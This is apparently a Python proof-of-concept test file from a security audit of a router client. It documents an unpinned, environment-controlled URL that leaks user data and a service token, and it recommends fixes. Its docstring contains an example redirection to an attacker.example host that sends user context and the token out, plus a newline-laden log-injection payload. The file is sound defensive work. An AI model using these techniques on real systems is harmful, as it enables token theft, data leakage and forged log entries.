"""PoC 2.6 / 2.9 — AETHER_ROUTER_URL is per-call env read, no identity
pinning.

lib/router_client.py:117:
    url = os.environ.get("AETHER_ROUTER_URL")

The URL is read fresh per call (intentional — hot rotation without restart).
But:

1. No TLS certificate pinning. If an attacker can mutate the orchestrator's
   env (via a compromised systemd unit override, a sibling service with
   os.environ write, a privileged shell on VPS2, etc.), setting
   AETHER_ROUTER_URL to http://attacker.example/pick makes router_client
   send a RoutingContext (userId, tier, uvtBalance, requestId, traceId,
   opusPctMtd) to the attacker.

2. The RoutingContext contains user_id (UUID) and a snapshot of the user's
   uvt balance. Not catastrophic on its own, but each pick() call leaks
   the requesting user's id + balance to whoever holds the URL.

3. Shadow mode today is log-only → attacker-controlled PolicyGate has no
   routing effect. BUT: the log line `router_would_pick: <chosen_model>`
   takes the attacker-supplied chosen_model verbatim. If chosen_model
   contains newlines (`"opus\n2026-04-22 CRITICAL: USER admin LOGIN OK"`),
   the log aggregator may parse it as a separate log line — log-injection
   vector. Python's logging stdlib doesn't escape control chars in %s
   substitution.

4. FUTURE-CRITICAL at PR 2 cutover: once shadow_mode flips to
   enforcement, attacker-controlled PolicyGate can choose any chosen_model.
   Without identity verification beyond "token in x-aether-internal header",
   this is a model-substitution path.

5. The AETHER_INTERNAL_SERVICE_TOKEN is sent as a header to WHATEVER URL
   AETHER_ROUTER_URL points to — no origin check. If the attacker's URL
   is reached first, they capture the token → can then forge requests to
   the REAL PolicyGate.

Severity:
    - Today (shadow mode):           LOW (log injection + context leak)
    - At PR 2 cutover (enforce):     HIGH → CRITICAL (model substitution,
                                     token leak, balance-check bypass)

Fix:
    - Pin the URL to a hardcoded constant (loaded from a sealed config),
      not an env var.
    - OR verify the server TLS cert fingerprint against a pinned value
      in router_client._get_client() (httpx supports `verify=` with a
      custom SSL context).
    - AND/OR require mTLS with client-cert pinning for the internal
      gate call.
    - Sanitize chosen_model before logging (strip \n, \r, \x00-\x1f).
"""
from __future__ import annotations

import sys
from pathlib import Path

REPO = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(REPO))


def test_url_read_from_env_each_call_no_pin() -> None:
    """Confirm router_client reads URL from env with no allowlist check."""
    text = (REPO / "lib" / "router_client.py").read_text(encoding="utf-8")
    assert 'os.environ.get("AETHER_ROUTER_URL")' in text, (
        "Mechanism changed — re-read router_client.pick() and update PoC."
    )
    # No hostname allowlist, no cert-pin config anywhere in the module.
    # Look for TLS-pinning language specifically, not a substring false-hit
    # on "typing" / "pipeline" / etc.
    import re as _re
    pin_patterns = _re.findall(
        r"\b(cert_pin|pinned_fingerprint|TLS[_ ]pin|certificate pinning|"
        r"pin_cert|ssl_pin|pinned_ca)\b",
        text,
        flags=_re.IGNORECASE,
    )
    assert not pin_patterns, (
        f"Looks like TLS pinning was added ({pin_patterns}). "
        "Great — update this assertion."
    )
    # `verify=False` would disable TLS altogether (worse); absence of any
    # `verify=` means httpx default (verify against system trust store),
    # which still does NOT pin.
    assert "verify=False" not in text, (
        "TLS verification DISABLED in router_client — this is worse than "
        "no pinning."
    )


def test_token_sent_to_env_controlled_url() -> None:
    """The same token header goes to whatever the env var says."""
    text = (REPO / "lib" / "router_client.py").read_text(encoding="utf-8")
    assert '"x-aether-internal": token' in text, (
        "Header plumbing changed — re-read."
    )
    # Token is read from env without origin-binding:
    assert 'os.environ.get("AETHER_INTERNAL_SERVICE_TOKEN")' in text


def test_chosen_model_logged_verbatim() -> None:
    """`log.info('router_would_pick: %s', shadow.chosen_model)` — no escape."""
    text = (REPO / "lib" / "uvt_routes.py").read_text(encoding="utf-8")
    assert 'log.info("router_would_pick: %s", shadow.chosen_model)' in text, (
        "Logging changed — confirm no sanitization was added."
    )


if __name__ == "__main__":
    test_url_read_from_env_each_call_no_pin()
    test_token_sent_to_env_controlled_url()
    test_chosen_model_logged_verbatim()
    print("AETHER_ROUTER_URL is env-controlled, no pin, unsanitized logging. "
          "Low severity today; CRITICAL risk at PR 2 cutover.")
